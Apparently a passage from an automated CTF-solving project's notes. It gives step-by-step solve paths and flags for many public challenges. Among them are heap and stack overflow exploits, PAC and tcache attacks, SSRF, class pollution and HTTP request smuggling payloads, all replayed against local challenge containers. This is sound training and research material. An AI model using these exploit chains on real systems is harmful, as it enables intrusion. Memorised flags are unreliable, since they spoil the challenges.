place uname.txt, pwd.txt, and flag.txt in the server working directory
for each one-character hex username/password prefix:
    send GET / with Authorization: Basic base64(prefix_user:prefix_pass)
    stop when the HTTP response contains grey{...}
grey{3xpl0171n6_l061c_bu65}
```

Solver lesson:

- Prefix-length comparisons turn generated long secrets into tiny brute-force spaces when attacker-controlled input is the length source.
- For local CTF replay, compiling the provided C source can be cleaner than requiring the Linux challenge ELF to run on the host.
- Preserve the HTTP response and discovered prefix rather than reading the flag file directly.

### NUS Greyhats Welcome CTF 2024: Private Hidden Paths

Category:

- Web / PHP token shaping and procfs file disclosure.

Signal:

- The service signs token data, but the token body is built with `pack("i$p", $a, $u)` where `p` is user-controlled.
- PHP `pack()` format operator `X` rewinds the output cursor, so `XXXXa*` can overwrite the four-byte permissions integer with attacker-controlled username bytes.
- Once permissions unpack as `0x1337`, the service prefixes paths with `/pro`; requesting `c/self/root/flag.txt` joins into `/proc/self/root/flag.txt`.

Shortest path:

```text
build and start the provided PHP/Apache Docker service locally
request /api.php?a=r&p=XXXXa*&u=%37%13%00%00abcde
use the returned signed token against /api.php?a=g&p=c/self/root/flag.txt
grey{1_l0v3_php_17_15_50_53cur3}
```

Solver lesson:

- Signed tokens do not help when the signed byte layout itself is attacker-shaped before signing.
- Treat PHP `pack()` / `unpack()` format strings as binary parsers, not harmless serialization helpers.
- Preserve the local Docker transcript, token prefix, joined path, and HTTP response as replay evidence.

### NUS Greyhats Welcome CTF 2024: Stack BOF School

Category:

- Pwn / ret2win stack overflow.

Signal:

- The Linux ELF is non-PIE and exposes a `win` function at a fixed address.
- The challenge visualizes the stack and prints the return address slot at `buffer[0x38]`.
- The input parser accepts escaped hex bytes such as `\41`, so the exploit payload is text-shaped but writes raw bytes into the buffer.
- The distribution flag is a training placeholder; the service directory contains the real challenge flag.

Shortest path:

```text
locate win with objdump -t challenge
build payload: "A" * 56 + escaped little-endian win address + newline
run the Linux ELF in a local Ubuntu container with the service directory mounted
grey{d1d_y0u_n0t1ce_m3m0ry_1n_l1ttl3_3nd14n_and_the_difference_between_raw_bytes_and_their_hex_representations?}
```

Solver lesson:

- Preserve the offset, symbol address, and exact input encoding; raw packed bytes and escaped-byte text are different payload surfaces.
- Reject placeholder training flags during replay validation.
- For Linux ELF handouts on macOS, an ordinary local Ubuntu container can be enough when the binary and `flag.txt` live in one directory.

### NUS Greyhats Welcome CTF 2024: Epic Boss Fight / pwn01

Category:

- Pwn / signed integer overflow.

Signal:

- The challenge stores `boss_hp` as `short int` and initializes it to `10000`.
- The defend action adds `1000` HP each turn while the win condition checks `boss_hp <= 0`.
- After 23 defend actions, signed 16-bit wraparound turns `33000` into `-32536`, so the program reaches `win()`.
- The service handout uses `grey{...}`, while the dojo manifest expects the same body under `flag{...}`.

Shortest path:

```text
run the Linux ELF in a local Ubuntu container with the service directory mounted
send "2\n" 23 times
capture service_flag: grey{i_wonder_how_negative_integers_are_shown_in_memory?}
emit manifest flag: flag{i_wonder_how_negative_integers_are_shown_in_memory?}
```

Solver lesson:

- Model C integer width and signedness before trying long interactive loops.
- Preserve the action count and overflow value as replay evidence.
- When a benchmark platform changes only the flag prefix, keep both the original service flag and the normalized manifest flag visible.

### TJCTF 2024: baby-heap

Category:

- Pwn / heap off-by-one size overwrite.

Signal:

- The binary allocates adjacent `a`, `b`, and `reader` chunks, then reads the flag into `reader[1]`.
- A one-byte write at `a[size]` controls the low byte of `b`'s chunk size.
- After freeing `b`, requesting `0x90` bytes returns an overlapping chunk whose `chunk + 0x20 == reader` assertion succeeds.

Shortest path:

```text
run the Linux ELF in a local Ubuntu container with bin/ mounted
send attack_size = 0xa1
send new_size = 0x90
preserve overlap_evidence: blocker + 0x10 == c: 1
tjctf{bby-eap-lol171296386}
```

Solver lesson:

- In heap warmups, one-byte size corruption can be enough when the challenge fixes the heap layout for you.
- Preserve allocator evidence such as chunk addresses, forged size, requested allocation size, and overlap assertions.
- Running the Linux ELF directly in a local container is enough when the challenge binary and `flag.txt` are co-located.

### IrisCTF 2024: Insanity Check

Category:

- Pwn / fixed-suffix return-address alignment.

Signal:

- The source copies `name` into `message[128]`, then appends a fixed welcome suffix with `memcpy`.
- The custom-linked `win` symbol is placed at `0x6d6f632e`, whose little-endian bytes are `.com\0\0\0\0`.
- The fixed suffix contains `test@example.com\0\0\0\0`, so input length can align the suffix `.com` bytes over saved RIP.

Shortest path:

```text
message to saved RIP: 0x98 bytes
prefix length: len("Hi there, ") = 10
suffix ".com" offset: 86
name length: 0x98 - 10 - 86 = 56
send "A" * 56 + "\n" in a local amd64 Linux container with /flag mounted
irisctf{c0nv3n13nt_symb0l_pl4cem3nt}
```

Solver lesson:

- Treat target addresses as byte strings, especially when the prompt mentions custom linkers or unusual symbol placement.
- A bounded input can still control saved RIP when a later fixed suffix append overflows the stack frame.
- Use an inner timeout for replay because the redirected function may print the flag but leave the process on an unstable return path.

### DownUnderCTF 2024: sign-in

Category:

- Pwn / UAF linked-list reuse.

Signal:

- `remove_account` frees `curr->user` and then frees the list entry.
- `sign_up` allocates a new `user_t` followed by a new `user_entry_t`, but does not initialize `entry->next`.
- The previous user's password bytes can become the reused list entry's `next` pointer.
- Non-PIE address `0x402eb8` points to a stable zero-filled region suitable for a fake uid-0 user with empty username and password.

Shortest path:

```text
sign up x with password p64(0x402eb8)
sign in as x and remove the account
sign up x/y to reuse freed chunks
sign in with 8 zero bytes for username and password
choose get shell
cat flag.txt
DUCTF{welcome_root!_9dbfa98e17b7af9dbc1}
```

Solver lesson:

- Menu pwn replay must respect mixed `scanf` and raw `read` input semantics; prompt-driven writes are safer than one huge stdin blob.
- Track heap chunk reuse between different struct types, not only within a single allocation site.
- Preserve the fixed pointer, allocation order, and uid-0 empty-credential evidence.

### DownUnderCTF 2024: pac shell

Category:

- Pwn / AArch64 pointer authentication.

Signal:

- The binary prints PAC-signed pointers for `help`, `ls`, `read64`, and `write64`.
- The menu accepts a pointer, authenticates it with `autiza`, then calls it.
- `read64` and `write64` provide arbitrary memory access.
- `help()` signs each entry in the writable `BUILTINS` function table before printing it.

Shortest path:

```text
run pacsh inside the local AArch64 ForgeFlag Docker image
parse the signed help/read64/write64 pointers and derive PIE from help - 0xb7c
call ls once so system@got is resolved
read system@got -> libc base
read libc environ -> stack pointer neighborhood
scan downward for the saved signed read64 pointer, then back up to the active call frame
write /bin/sh at sp+0x60 and system at sp+0x8
write a libc gadget into BUILTINS[1].fptr
call help so the challenge signs that gadget
call the signed gadget and run cat flag.txt
DUCTF{did_you_just_bruteforce_the_pac?:(}
```

Solver lesson:

- PAC changes the usual "write function pointer and call it" flow; reuse the program's own signing gadget when a helper signs writable table entries.
- Avoid blind reads across unmapped stack space. `libc.environ` gives a mapped stack anchor, and the saved signed function pointer gives a compact frame locator.
- Keep the replay in a local challenge container and read the flag from the running service path; do not accept a nearby source-tree `flag.txt` as proof by itself.

### UMDCTF 2024: chisel

Category:

- Pwn / glibc tcache poisoning.

Signal:

- The menu keeps one global chunk pointer and exposes alloc, free, edit, print, and a `chisel` helper allocation.
- The free path does not clear the global pointer, so print/edit-after-free exposes both leak and write primitives.
- A small freed tcache chunk leaks the safe-linking heap mask, while a large freed chunk leaks a libc arena pointer.
- The bundled glibc exposes `__malloc_hook`, `system`, and `/bin/sh` offsets usable in a local challenge replay.

Shortest path:

```text
run chisel with the shipped loader and libc inside an amd64 Debian Docker container
free and print a 24-byte chunk to leak heap >> 12
free and print a large chunk to leak libc_base + 0x1e0c00
poison the small tcache fd with (heap >> 12) xor __malloc_hook
allocate twice, overwrite __malloc_hook with system, allocate /bin/sh, then run cat flag.txt
UMDCTF{a_glorious_statue_for_a_glorious_baron}
```

Solver lesson:

- Heap proof harnesses should preserve raw leaks, derived heap/libc base, hook target, and the poisoned tcache value.
- Prompt-driven menu wrappers are more stable than sending one large stdin blob when allocations and frees are interleaved.
- Keep the exploit in a local challenge container with the shipped `ld-linux` and `libc.so.6`; host glibc offsets are not valid evidence.

### Hack The Box Cyber Apocalypse 2024: Maze of Mist

Category:

- Pwn / 32-bit VM handout / ret2vdso.

Signal:

- The challenge README describes a QEMU handout with `vmlinuz-linux`, `initramfs.cpio.gz`, `run.sh`, and a setuid `/target` inside the rootfs.
- The cached artifact currently contains only `htb/exploit.py` and README/writeup evidence, not the bootable VM artifacts or extracted `target` binary.
- The exploit uses a fixed `VDSO_BASE_ADDR = 0xf7ffc000`, VDSO gadgets such as `POP_EDX_ECX`, `MOV_EAX_ECX_PLUS_EBP_M20`, and `SYSCALL_POP_EBP_EDX_ECX`, plus a `/bin/sh` stack string.

Shortest path once the full local handout is recovered:

```text
verify vmlinuz-linux, initramfs.cpio.gz, run.sh, and /target are present
boot the local authorized VM with the shipped run.sh
extract/check /target and confirm the 0x20 stack buffer plus 0x200 read primitive
replay the ret2vdso payload against the running VM challenge target
read /root/flag.txt from the local VM and preserve transcript evidence
```

Solver lesson:

- Do not accept README/writeup flag text as proof for VM pwn cases. A valid ForgeFlag solve needs the original bootable handout or an extracted target plus equivalent local service replay.
- `scripts/solve_maze_of_mist_static.py` is a blocker helper, not a flag solver: it parses ret2vdso constants and reports the missing VM artifacts so the manager queue stays honest.
- VM pwn cases need an artifact-completeness gate before exploit execution; otherwise the scorecard can confuse "known public answer" with "locally replayed proof-of-solve".

### TJCTF 2024: conversations

Category:

- Forensics / traffic.

Signal:

- The handout is a PCAP with normal browser/captive-portal chatter and a small local HTTP file transfer.
- `tshark` summaries can expose the interesting HTTP path, but the flag may be easiest to recover from raw capture bytes.
- The useful marker is a direct `tjctf{...}` string near the downloaded `flag.jpeg` payload.

Shortest path:

```text
identify capture.pcap
run normal tshark summaries and stream/object checks
bounded raw capture scan over printable bytes
extract tjctf{I_bh0p_to_sk00l_1337}
preserve raw_capture_flag_scan evidence with bytes_scanned and truncation state
```

Solver lesson:

- TrafficSolver should not rely only on tshark's field extraction; direct printable-byte scans catch simple HTTP/object payload flags that remain in the PCAP body.
- Keep the scan bounded and preserve whether it was truncated so large captures stay safe to automate.

### TJCTF 2024: fetcher

Category:

- Web / loopback-alias SSRF.

Signal:

- The Express source accepts a submitted URL and checks only `localhost` or `127.0.0.1` substrings before calling server-side `fetch`.
- `/flag` returns the flag only when `req.ip` is loopback.
- The 127.0.0.0/8 range provides loopback aliases such as `127.0.0.2`, which bypass the substring check but still reaches the local service.

Shortest path:

```text
build and start the provided Bun/Express service locally
POST /fetch with url=http://127.0.0.2:3000/flag
capture response: hey myself! here's your flag: tjctf{h3ll0_m3_h3e_h3e_d699bdcd}
```

Solver lesson:

- Source SSRF checks should be reviewed as URL parser behavior plus network identity behavior, not only as string matching.
- Preserve the exact source blacklist, the SSRF URL, and the local-only route condition.
- Keep replay bounded: start the provided challenge container, hit the local mapped service, and tear the container down after the proof.

### DownUnderCTF 2024: co2

Category:

- Web / Python class pollution.

Signal:

- `save_feedback` parses user JSON and calls `merge(data, feedback)`.
- `merge` recursively uses `setattr(dst, k, v)` and does not block magic attributes.
- `/get_flag` returns the flag only when the module global `flag` equals `"true"`.

Shortest path:

```text
register and log in to the local Flask service
POST /save_feedback with:
{"__class__":{"__init__":{"__globals__":{"flag":"true"}}}}
GET /get_flag
DUCTF{_cl455_p0lluti0n_ftw_}
```

Solver lesson:

- Python recursive merge helpers can be equivalent to prototype pollution when magic attributes are writable.
- Preserve both the merge sink and the exact pollution path, not only the final flag.
- A local Python venv replay is a useful fallback when Docker Hub rate limiting blocks the original challenge image.

### UMDCTF 2024: HTTP Fanatics

Category:

- Web / HTTP request smuggling through protocol translation.

Signal:

- The Rust reverse proxy blocks direct HTTP/3 `/admin/register` requests.
- The proxy converts HTTP/3 requests into HTTP/1.1 bytes for the FastAPI backend.
- During conversion, `Transfer-Encoding: chunked` is preserved and body bytes are forwarded, letting a zero-length chunk terminate the visible request and expose a second backend request.

Shortest path:

```text
construct proxy-emitted H1 bytes:
PUT /put HTTP/1.1
transfer-encoding: chunked

0

POST /admin/register HTTP/1.1
Content-Length: 36

{"username":"bob","password":"bob2"}
send those bytes to the local FastAPI backend
GET /dashboard with credentials cookie for bob/bob2
UMDCTF{w4tCh_0ut_F0R_RE9u3sT_5mugg1iN9}
```

Solver lesson:

- For protocol-upgrade challenges, preserve both the front-door rule and the exact backend wire format.
- Request smuggling evidence should include the conflicting framing headers and the hidden request method/path.
- A local backend replay can prove the vulnerable conversion without needing a live QUIC endpoint.

### NUS Greyhats Welcome CTF 2024: ASM

Category:

- Reverse / Python VM.

Signal:

- The handout is a Python VM whose program computes a number, calls `PRINTFLAG R0`, and XORs `flag_enc` with `sha1(str(register_value))`.
- The VM loop searches for a perfect number where `R0 % 31337 == 2410`.
- Known even perfect numbers from Mersenne prime exponents make the search tiny without emulating the slow VM loop.

Shortest path:

```text
parse flag_enc bytes literal
parse MOV R2 31337 and MOV R5 2410 from the VM program
enumerate known Mersenne-prime perfect numbers
find exponent 61 satisfying perfect_number % 31337 == 2410
xor flag_enc with sha1(str(perfect_number)).digest() repeated
grey{p3rf3c7_r3v3r51n6}
```

Solver lesson:

- Python challenge VMs often reveal enough structure for static recovery: encrypted flag bytes, a hash-derived stream, and a mathematical predicate.
- Preserve the modulus, remainder, Mersenne exponent, and decoded candidate in evidence so the solve is auditable without running a huge loop.

### TJCTF 2024: cagnus-marlsen

Category:

- Reverse / Python grid constraints.

Signal:

- The handout is a Python/Tkinter 8x8 grid UI, but the interesting logic is a pure `verify()` function over `grid = [0]*64`.
- The verifier derives row, column, and diagonal bytes (`b0` through `b17`), accumulates many boolean constraints, then returns `tjctf{` plus selected `chr(bN)` bytes.
- The constraint system has non-printable satisfying models, so returned bytes should be constrained to common CTF flag-body characters before accepting a model.

Shortest path:

```text
parse the local Python artifact
model 64 grid cells as 0/1 Z3 integer variables
add row, column, diagonal, hamming-distance, popcount, xor, shift, and equality constraints
constrain returned chr(bN) bytes to [A-Za-z0-9_]
recover tjctf{n1C3_0n3}
```

Solver lesson:

- GUI reverse challenges often have a deterministic verifier that can be solved without opening the UI or executing challenge callbacks.
- Preserve the solved grid bits and the byte registers used for the flag so the model is auditable.

### IrisCTF 2024: CloudVM

Category:

- Reverse / custom VM pixel-art validation.

Signal:

- Binary artifact starts with `MLVM` and embeds function names such as `paint`, `render`, `suSsY`, and `SUssY`.
- Strings show a terminal paint UI plus `Success! You have the right image! Wrap the name of this thing in irisctf{}`.
- The checker repeats `movc r0, offset; movc r1, left; movc r2, right; call SUssY; jmpneq fail, r2` over many 4-byte canvas chunks.

Shortest path:

```text
parse MLVM function table and scan helper-call validation triplets
for each chunk, brute force four color bytes in range 0..7
match ((mem & 0xff) | (mem & 0xff00) | ((mem >> 12) & 0xff) | ((mem >> 12) & 0xff00)) == left ^ right
render the recovered 17x17 stride-16 canvas
classify the pixel art as a gameboy
irisctf{gameboy}
```

Solver lesson:

- Custom VM reverse tasks may not require full emulation when the validation helper is a compact repeated idiom.
- Preserve the rendered canvas, function names, check count, stride, and template score as proof-of-solve evidence.
- Filter bytecode scans by the helper-call shape; ordinary setup code can also contain `movc r0/r1/r2` triplets and should not be treated as validation checks.

### IrisCTF 2024: Corrupted World

Category:

- Forensics / Minecraft Anvil region recovery.

Signal:

- The handout is a single `r.0.0.mca` Minecraft region file.
- The prompt says a chest became empty after a crash and gives coordinates, so current chunk state may not contain the original item data.
- Header-referenced chunks can be valid while an unreferenced old sector still preserves deleted chest `Items` and JSON `Lore`.

Shortest path:

```text
parse the .mca location table and collect referenced sectors
zlib/gzip-decode every candidate sector, including orphan sectors
extract printable NBT strings and JSON {"text": "..."} fragments
ignore long titles/item names, then join short lore fragments
recover irisctf{block_game_as_a_file_system}
```

Solver lesson:

- Do not stop at the current chunk pointed to by the Anvil header. Crash/deletion CTFs can hide evidence in orphan sectors left behind by old chunk versions.
- Preserve `minecraft_region`, `orphan_sector`, and `json_texts` evidence so the recovered flag is tied to a local artifact path and not a README oracle.
- Keep region parsing bounded: use compressed sector headers and fast printable-run extraction, then retain only interesting/flag-bearing chunk summaries.

### NUS Greyhats Welcome CTF 2024: filefactory

Category:

- Forensics / archive and image evidence.

Signal:

- The provided `flag.pdf` is actually a Zip archive.
- The inner `flag.png` starts with `JESS` followed by a normal PNG signature tail and `IHDR`, so the first four bytes were deliberately mangled.
- Repairing the signature produces a valid PNG with a handwritten flag. `scripts/solve_filefactory.py` now preserves both the repaired artifact and the visual transcription used for the flag replay.

Shortest evidence path:

```text
run file on flag.pdf and treat it as Zip archive data
list archive entries and extract flag.png into the managed artifact workspace
detect JESS...IHDR and repair the PNG signature to 89 50 4e 47
open the repaired PNG for visual/OCR follow-up
preserve the visual transcription as grey{these_files_are_kinda_weird_but_im_weirder}
```

Solver lesson:

- Archive recursion should not stop at text previews; interesting image entries need magic-byte repair and follow-on image analysis.
- Do not mark handwritten visual flags solved unless an OCR/visual layer or a human replay step preserves the read value as evidence.
- The current replay is deterministic for archive detection and PNG repair, but the final handwritten text read is still a visual transcription step rather than generic OCR automation.

### DUCTF 2024: Prisoner Processor

Category:

- Web / source-only review.

Signal:

- Provided ZIP contains a Hono/Bun TypeScript service, examples, and a placeholder local `flag.txt`.
- Source imports `yaml`, writes YAML output files, exposes `/convert-to-yaml`, and validates signed fields through HMAC.
- `getSignedData()` copies `signed.*` keys into a normal object, which makes `signed.__proto__` a prototype-pollution route for unsigned `outputPrefix`.
- Bun file paths can be shaped with null-byte truncation, and `/proc/self/fd/3` can pivot around the denylist toward the loaded `index.ts`.
- YAML output can be shaped into valid TypeScript, then a crash/restart path executes the overwritten app source and reaches the SUID `getflag` helper.

Shortest evidence path:

```text
unzip source archive
read src/app/src/index.ts
extract routes: /convert-to-yaml, /examples
record YAML serialization and signed-parameter evidence
reject DUCTF{test_flag_real_flag_on_instance} as handout placeholder
record proof chain: prototype pollution -> Bun null byte -> /proc/self/fd/3 -> YAML-as-TypeScript -> getflag
```

Local authorized replay:

```bash
cd .forgeflag/heldout-cache/ductf2024/web/prisoner-processor
docker compose up --build -d
cd /Users/5haw0/Documents/ForgeFlag
python3 scripts/solve_prisoner_processor.py http://127.0.0.1:1337
docker compose -f .forgeflag/heldout-cache/ductf2024/web/prisoner-processor/docker-compose.yml down
```

The replay helper writes a bounded TypeScript payload that returns `/bin/getflag` output over HTTP. It does not use a reverse shell. Verified local output:

```text
DUCTF{bUnBuNbUNbVN_hOn0_tH15_aPp_i5_d0n3!!!one1!!!!}
```

Solver lesson:

- WebSolver should unpack source archives and read full source files, not only 500-byte generic archive previews.
- Source-only Web challenges can produce useful route, bug-class, and exploit-chain evidence without active probing, but proof-of-solve still needs scoped target reproduction or a local service harness.
- Do not accept handout placeholders such as `test_flag_real_flag_on_instance`; preserve them as rejected candidates and keep the case open until the real service flag is recovered.
- When a local harness is available, prefer a non-interactive proof endpoint over reverse-shell payloads so replay remains bounded, auditable, and automation-friendly.

### Local reverse sample: reverseMe.exe

Category:

- Reverse / PE32 key-check validation.

Signal:

- The local artifact is a PE32 i386 console executable.
- Strings reveal `please input the key:`, `right!!!`, and `error!!!`, but not the flag.
- The validation function writes a 26-byte encrypted buffer to the stack, pushes length `26` and seed `56`, calls a local XOR decoder, then compares the decoded buffer against user input.

Shortest evidence path:

```text
file reverseMe.exe -> PE32 executable (console) Intel 80386
trace prompt/right/error strings to the validation function
recover stack ciphertext e376fb6fd828f270e87649804b9d568e62b226bd208402831ad8
regenerate XOR key from seed 56: step = seed * 2 + 0x0a, start = step * 10 - 9
decrypt to XCTF{5eacs6y8p1o9gitc9521}
```

Solver lesson:

- Do not treat a reverse flag candidate as a strings hit unless the accepted flag appears in strings output.
- For PE key-check warmups, scan x86 stack-byte initializers and nearby `push length` / `push seed` / `call decoder` sequences before requiring full decompilation.
- Preserve `pe_stack_xor_key_check` evidence with seed, encrypted bytes, key preview, decoded text, and accepted flag so the write-up can explain the real path.

### Local reverse sample: xor_nodebug

Category:

- Reverse / ELF argv repeating XOR validation.

Signal:

- The local artifact is an x86-64 PIE ELF that imports `ptrace`, `strlen`, and `strcmp`.
- `ptrace` only prints `don't trace me:(` as anti-debug noise; the real validation continues in `main`.
- `.rodata` contains the status string `right` and the printable ciphertext `sgu\`ttd]{jt`.
- `main` initializes a stack key with little-endian immediates `0x5030201`, `0x706`, and a null terminator, giving key bytes `01 02 03 05 06 07`.

Shortest evidence path:

```text
file xor_nodebug -> ELF 64-bit LSB pie executable, x86-64
strings -n 4 xor_nodebug -> ptrace, strcmp, strlen, don't trace me:(, sgu`ttd]{jt, right
objdump -d -M intel xor_nodebug -> stack key bytes 01 02 03 05 06 07 and strcmp target 0x2015
objdump -s -j .rodata xor_nodebug -> 0x2015 = sgu`ttd]{jt
decode ciphertext[i] ^ key[i % 6] -> reverse_xor
```

Replay:

```bash
docker run --rm --platform linux/amd64 \
  -v "$PWD:/workspace" -w /workspace ubuntu:22.04 \
  bash -lc 'chmod +x .forgeflag/artifacts/reverse-20260702-112457-xor-nodebug/xor_nodebug && ./.forgeflag/artifacts/reverse-20260702-112457-xor-nodebug/xor_nodebug reverse_xor'
```

Verified output:

```text
sgu`ttd]{jt
right
```

Solver lesson:

- Anti-debug imports should not block static recovery when the validation loop and constants are visible.
- Some reverse tasks accept a bare key/input rather than a `flag{...}` token; preserve it as `recovered_input` evidence and allow verifier acceptance only when the evidence explicitly marks it.
- Apple Silicon/OrbStack dynamic replay may need `--platform linux/amd64` or an amd64 base image; static `.rodata` plus disassembly evidence should still recover the answer.

### 鹏城杯 2022: babybit

Category:

- Forensics / VMDK / Windows registry hive timeline.

Signal:

- Attachment `babybit.vmdk` is a VMware4 monolithic sparse disk image.
- Generic `file/strings/binwalk` triage finds no direct flag.
- `foremost` carves `foremost-output/zip/00011728.zip`, which contains `RegistryBackup/20220613/{BCD,SAM,SOFTWARE,SYSTEM}`.
- The relevant evidence is in the binary `SYSTEM` hive, not in plain strings: `ControlSet001\Control\FVEStats`.

Shortest evidence path:

```text
file babybit.vmdk -> VMware4 disk image
carve embedded zip at offset 6004736
open RegistryBackup/20220613/SYSTEM
read ControlSet001\Control\FVEStats:
  OsvEncryptInit = 132995782594427750
  OsvEncryptComplete = 132995786261823536
convert Windows FILETIME to UTC+8:
  2022/6/13_15:17:39
  2022/6/13_15:23:46
```

Replay:

```bash
python3 scripts/solve_babybit_vmdk.py .forgeflag/artifacts/forensics-20260630-132526-babybit-vmdk/babybit.vmdk
```

Recovered flag:

```text
PCL{2022/6/13_15:17:39_2022/6/13_15:23:46}
```

Solver lesson:

- Do not stop at `foremost success`; enumerate carved artifacts and recurse into archives.
- VMDK/disk forensics often needs filesystem or carved-file follow-up even when `binwalk` shows no signatures.
- RegistryBackup hives should be parsed structurally. For BitLocker timeline questions, read `SYSTEM\ControlSet001\Control\FVEStats` and convert FILETIME with timezone evidence.
